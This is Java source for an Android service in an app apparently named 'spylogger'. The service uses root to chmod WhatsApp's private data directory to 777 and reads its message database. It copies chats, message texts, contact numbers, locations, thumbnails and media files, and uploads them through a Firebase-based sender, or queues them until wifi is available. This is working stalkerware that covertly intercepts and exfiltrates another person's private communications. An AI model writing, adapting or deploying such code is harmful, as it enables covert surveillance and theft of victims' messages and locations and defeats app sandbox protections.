package com.gravatasufoca.spylogger.services;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager.NameNotFoundException;
import android.util.Log;

import com.google.firebase.iid.FirebaseInstanceId;
import com.gravatasufoca.spylogger.dao.DatabaseHelper;
import com.gravatasufoca.spylogger.dao.whatsapp.DatabaseHelperWhatsApp;
import com.gravatasufoca.spylogger.helpers.NetworkUtil;
import com.gravatasufoca.spylogger.helpers.TaskComplete;
import com.gravatasufoca.spylogger.model.Mensagem;
import com.gravatasufoca.spylogger.model.TipoAcao;
import com.gravatasufoca.spylogger.model.TipoMensagem;
import com.gravatasufoca.spylogger.model.TipoMidia;
import com.gravatasufoca.spylogger.model.Topico;
import com.gravatasufoca.spylogger.model.whatsapp.Messages;
import com.gravatasufoca.spylogger.receivers.Alarm;
import com.gravatasufoca.spylogger.utils.Utils;
import com.gravatasufoca.spylogger.vos.FcmMessageVO;
import com.j256.ormlite.dao.Dao;
import com.j256.ormlite.dao.GenericRawResults;
import com.j256.ormlite.field.DataType;
import com.j256.ormlite.stmt.QueryBuilder;
import com.stericson.RootTools.RootTools;
import com.stericson.RootTools.execution.CommandCapture;

import java.io.File;
import java.io.IOException;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Set;

public class WhatsAppService  implements Mensageiro{

    private static final int MAX_MSGS = 5000;
    private String inFileName;

    private Context context;

    public WhatsAppService(Context context) {
        if(context!=null) {
            this.context = context;
            onCreate();
        }else{
            throw new RuntimeException("eh necessario um contexto valido");
        }
    }

    private void chmod() {

        try {
            CommandCapture command = new CommandCapture(0, "chmod -R 777 "
                    + android.os.Environment.getDataDirectory().toString()
                    + "/data/com.whatsapp", "chmod -R 777 "
                    + context.getPackageManager()
                    .getPackageInfo(context.getPackageName(), 0).applicationInfo.dataDir);
            RootTools.getShell(true).add(command);
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    public void onCreate() {
        chmod();
        try {
            inFileName = context.getPackageManager()
                    .getPackageInfo(context.getPackageName(), 0).applicationInfo.dataDir
                    + "/databases/" + DatabaseHelper.DATABASE_NAME;
        } catch (NameNotFoundException e) {
           Log.e("spylogger",e.getMessage());
        }
    }


    public synchronized void start() {
        if ((new File(DatabaseHelperWhatsApp.DATABASE_NAME)).exists()) {
            updateTopicos();
        }
    }


    private void updateTopicos() {
        DatabaseHelperWhatsApp external = new DatabaseHelperWhatsApp(context);
        DatabaseHelper dbHelper = new DatabaseHelper(context);
        Dao<Messages,Integer> daoMsgExternal;
        GenericRawResults<String[]> raws = null;
        List<Topico> topicos = new ArrayList<>();
        Iterator<String[]> iterator;
        try {
            dbHelper.getWritableDatabase();
            daoMsgExternal = external.getMessagesDao();
            daoMsgExternal.executeRaw("attach database '" + inFileName + "' as 'localdb' ");

            raws = daoMsgExternal.queryRaw("select _id,key_remote_jid, subject,sort_timestamp from chat_list where _id!=-1 and key_remote_jid not in( select idReferencia from localdb.topico where tipoMensagem=0 )");
            iterator = raws.iterator();
            int contador = 0;
            while (iterator.hasNext()) {
                String[] resultRaw = iterator.next();
                Topico topico = new Topico.TopicoBuilder()
                        .setIdReferencia(resultRaw[1])
                        .setNome(resultRaw[2])
                        .setGrupo(resultRaw[2] != null && !resultRaw[2].isEmpty())
                        .build(TipoMensagem.WHATSAPP);

                topicos.add(topico);
                contador++;
                if (iterator.hasNext()) {
                    if (contador == 500) {
                        contador = 0;
                        dbHelper.getDao(Topico.class).create(topicos);
                        topicos = new ArrayList<>();
                    }
                } else {
                    dbHelper.getDao(Topico.class).create(topicos);
                }
            }

        } catch (Exception e) {
            Log.e("spylogger", e.getMessage());
        } finally {
            try {

                if(topicos.isEmpty()){
                    try {
                        topicos=dbHelper.getDao(Topico.class).queryForAll();
                    } catch (SQLException e) {
                        Log.e("spylogger",e.getMessage());
                    }
                }

                if (raws != null) {
                    raws.close();
                }
                dbHelper.close();
                external.close();
                updateMsgs(topicos);
            } catch (IOException e) {
                Log.d("spylogger", "nao foi possivel fechar a conexao: " + e.getMessage());
            }
        }
    }

    private void updateMsgs(List<Topico> topicos) {
        DatabaseHelperWhatsApp external = new DatabaseHelperWhatsApp(context);
        DatabaseHelper dbHelper = new DatabaseHelper(context);
        Dao<Messages,Integer> daoMsgExternal;

        GenericRawResults<Object[]> rawResults = null;
        List<Mensagem> mensagens = new ArrayList<>();
        List<Mensagem> mensagensComMidia = new ArrayList<>();
        Iterator<Object[]> iterator;
        try {
            dbHelper.getWritableDatabase();
            daoMsgExternal = external.getMessagesDao();
            daoMsgExternal.executeRaw("attach database '" + inFileName + "' as 'localdb' ");

            String sqlQuery="SELECT " +
                    "  me._id, " +
                    "  me.key_remote_jid, " +
                    "  me.key_from_me, " +
                    "  me.data, " +
                    "  me.timestamp, " +
                    "  me.media_wa_type, " +
                    "  me.media_size, " +
                    "  me.remote_resource, " +
                    "  me.received_timestamp, " +
                    "  CASE WHEN th.thumbnail IS NOT NULL " +
                    "    THEN 1 " +
                    "  ELSE '' END, " +
                    "  me.media_mime_type, " +
//                    "  me.raw_data, " +
//                    "  me.thumb_image, " +
                    "  me.latitude, " +
                    "  me.longitude," +
                    "  th.thumbnail " +
                    "FROM messages me " +
                    "  left JOIN message_thumbnails th on th.key_remote_jid=me.key_remote_jid and th.key_from_me=me.key_from_me and th.key_id=me.key_id " +
                    "WHERE me.key_remote_jid != '-1' AND me._id NOT IN (SELECT idReferencia " +
                    "                                             FROM localdb.mensagem) AND me.key_remote_jid IN (SELECT idReferencia " +
                    "                                                                                           FROM localdb.topico)";
            rawResults = daoMsgExternal
                    .queryRaw(sqlQuery
                            , new DataType[]{
                                      DataType.INTEGER, DataType.STRING,DataType.INTEGER
                                    , DataType.STRING, DataType.DATE_LONG, DataType.STRING
                                    , DataType.STRING, DataType.STRING, DataType.DATE_LONG, DataType.INTEGER
                                    , DataType.STRING
//                                    , DataType.BYTE_ARRAY, DataType.BYTE_ARRAY
                                    , DataType.DOUBLE,DataType.DOUBLE,DataType.BYTE_ARRAY});

            iterator = rawResults.iterator();
            int contador = 0;
            while (iterator.hasNext()) {
                Object[] resultRaw;
                try {
                    resultRaw = iterator.next();
                } catch (Exception e) {
                    resultRaw = null;
                }
                if (resultRaw == null) {
                    if (!mensagens.isEmpty()) {
                        dbHelper.getDao(Mensagem.class).create(mensagens);
                    }
                    try {
                        rawResults.close();
                        dbHelper.close();
                        external.close();
                    } catch (IOException e) {
                    }
                    updateMsgs(topicos);
                    return;
                }

                Topico tmpTopico = null;
                for (Topico topico : topicos) {
                    if (topico.getIdReferencia().equals(resultRaw[1])) {
                        tmpTopico = topico;
                        break;
                    }
                }
                if (tmpTopico == null) {
                    Log.e(this.getClass().getSimpleName(), "TOPICO NAO ENCONTRADO: " + resultRaw[1]);
                    continue;
                }
                Mensagem mensagem = new Mensagem.MensagemBuilder()
                        .setIdReferencia(Integer.toString((Integer) resultRaw[0]))
                        .setRemetente("1".equals(resultRaw[2]))
                        .setTexto((String) resultRaw[3])
                        .setData((Date) resultRaw[4])
                        .setDataRecebida((Date) resultRaw[8])
                        .setTamanhoArquivo(Long.parseLong((String) resultRaw[6]))
                        .setTipoMidia(TipoMidia.getTipoMidia((String) resultRaw[5]))
                        .setMediaMime((String) resultRaw[10])
                        .setContato((String) (resultRaw[7] != null ? resultRaw[7] : resultRaw[1]))
                        .setTopico(tmpTopico)
                        .setTemMedia("1".equals(resultRaw[9]))
                        .setLatitude(resultRaw[11] != null ? (Double) resultRaw[11] : null)
                        .setLongitude(resultRaw[12] != null ? (Double) resultRaw[12] : null)
                        .build();
                if(resultRaw[13]!=null){
                    mensagem.setRaw_data(Utils.encodeBase64((byte[]) resultRaw[13]));
                }

                if (!mensagem.getRemetente()) {
                    if (resultRaw[7] != null && !((String) resultRaw[7]).isEmpty()) {
                        if (((String) resultRaw[7]).indexOf("@") != -1) {
                            mensagem.setNumeroContato(((String) resultRaw[7]).substring(0, ((String) resultRaw[7]).indexOf("@")));
                        } else {
                            mensagem.setNumeroContato(((String) resultRaw[7]));
                        }
                    } else {
                        if (((String) resultRaw[1]).indexOf("@") != -1) {
                            mensagem.setNumeroContato(((String) resultRaw[1]).substring(0, ((String) resultRaw[1]).indexOf("@")));
                        } else {
                            mensagem.setNumeroContato(((String) resultRaw[1]));
                        }
                    }
                } else {
                    mensagem.setContato(null);
                    mensagem.setNumeroContato(null);
                }

                if (tmpTopico == null) {
                    QueryBuilder<Topico, Integer> qb = (QueryBuilder<Topico, Integer>) dbHelper.getDao(Topico.class).queryBuilder();
                    qb.where().eq("idReferencia", resultRaw[1]);
                    tmpTopico = dbHelper.getDao(Topico.class).queryForFirst(qb.prepare());
                    mensagem.setTopico(tmpTopico);
                }
                mensagens.add(mensagem);
                if (mensagem.getTamanhoArquivo() > 0) {
                    mensagensComMidia.add(mensagem);
                }
                contador++;
                try {
                    if (iterator.hasNext()) {
                        if (contador == MAX_MSGS) {
                            contador = 0;
                            dbHelper.getDao(Mensagem.class).create(mensagens);
                            mensagens = new ArrayList<>();
                        }
                    } else {
                        dbHelper.getDao(Mensagem.class).create(mensagens);
                    }
                } catch (Exception e) {
                    dbHelper.getDao(Mensagem.class).create(mensagens);
                    try {
                        if (rawResults != null) {
                            rawResults.close();
                        }
                        dbHelper.close();
                        external.close();
                    } catch (IOException ee) {
                    }
                    updateMsgs(topicos);
                }
            }
            Log.i(this.getClass().getSimpleName(), "TERMINOU");

        } catch (SQLException e) {
            Log.e("spylogger", e.getMessage());
        } finally {
            try {
                if (rawResults != null) {
                    rawResults.close();
                }
                if (dbHelper != null) {
                    dbHelper.close();
                }

                if (external != null) {
                    external.close();
                }
                verificaArquivos(mensagensComMidia, 1);
            } catch (IOException e) {
            }
        }
    }


    private void verificaArquivos(List<Mensagem> mensagens, final int contador) {
        if(mensagens!=null && mensagens.size()>10){
            return;
        }
        Map<Mensagem, File> arquivos = new HashMap<>();
        final Set<Mensagem> pendentes = new HashSet<>();
        Set<Mensagem> existentes = new HashSet<>();
        int timeout = 60000;
        while (timeout > 0 && (pendentes.size() + existentes.size() < mensagens.size())) {
            for (Mensagem mensagem : mensagens) {
                File arquivo = Utils.getMediaFile(
                        mensagem.getTipoMidia(),
                        mensagem.getTamanhoArquivo(),
                        mensagem.getDataRecebida(), 1);
                if (arquivo != null) {
                    arquivos.put(mensagem, arquivo);
                    existentes.add(mensagem);
                } else {
                    pendentes.add(mensagem);
                }
            }
            try {
                Thread.sleep(10000);
                timeout -= 10000;
            } catch (InterruptedException e) {
            }
        }
        /**
         * envia caso esteja no wifi
         */
        if (NetworkUtil.isWifi(context)) {

            FcmMessageVO fcmMessageVO = new FcmMessageVO();
            fcmMessageVO.setTipoAcao(TipoAcao.REENVIAR_ARQUIVOS);
            fcmMessageVO.setChave(FirebaseInstanceId.getInstance().getToken());

            FcmHelperService fcmHelperService = new FcmHelperService(context, fcmMessageVO);
            fcmHelperService.enviarArquivos(new ArrayList<Mensagem>(existentes));
        } else {
            /**
             * guardo para enviar depois quando estiver conectado
             */
            DatabaseHelper dbHelper = new DatabaseHelper(context);
            try {
                Dao<Mensagem, Integer> dao = dbHelper.getDao(Mensagem.class);

                for (Mensagem mensagem : existentes) {
                    mensagem.setArquivo(Utils.getBytesFromFile(arquivos.get(mensagem)));
                    dao.update(mensagem);
                }

            } catch (SQLException e) {
                Log.e("spylogger",e.getMessage());
            }finally {
                dbHelper.close();
            }
        }

        if (!pendentes.isEmpty()) {
            if (Utils.alarm == null) {
                Utils.alarm = new Alarm();
            }

            Intent intent = new Intent(context, Alarm.class);
            final PendingIntent pi = PendingIntent.getBroadcast(context, 0, intent, 0);

            Utils.alarm.setRepeatingAlarm(context, pi, 5, new TaskComplete() {
                @Override
                public void onFinish(Object object) {
                    if (contador + 1 < 4) {
                        verificaArquivos(new ArrayList<Mensagem>(pendentes), contador + 1);
                    } else {
                        Utils.alarm.cancelAlarm(context, pi);
                    }
                }
            });
        }
    }
}